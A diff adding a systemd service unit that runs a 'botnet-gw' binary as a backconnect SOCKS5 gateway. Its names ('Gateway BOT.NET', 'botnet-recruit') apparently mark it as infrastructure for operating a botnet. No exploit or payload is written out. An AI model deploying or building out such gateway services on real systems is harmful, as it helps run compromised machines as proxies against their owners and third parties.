@@ -1,0 +1,23 @@
+# Gateway backconnect con frente SOCKS5 en loopback.
+[Unit]
+Description=Gateway BOT.NET
+After=network-online.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Slice=recruit.slice
+EnvironmentFile=/etc/botnet-recruit/env
+Environment=GW_SOCKS5_LISTEN=127.0.0.1:1080
+ExecStart=/usr/local/bin/botnet-gw --serve --gw-id gw-prod
+Restart=always
+RestartSec=5
+KillMode=control-group
+MemoryMax=320M
+TasksMax=128
+ProtectSystem=strict
+PrivateTmp=true
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
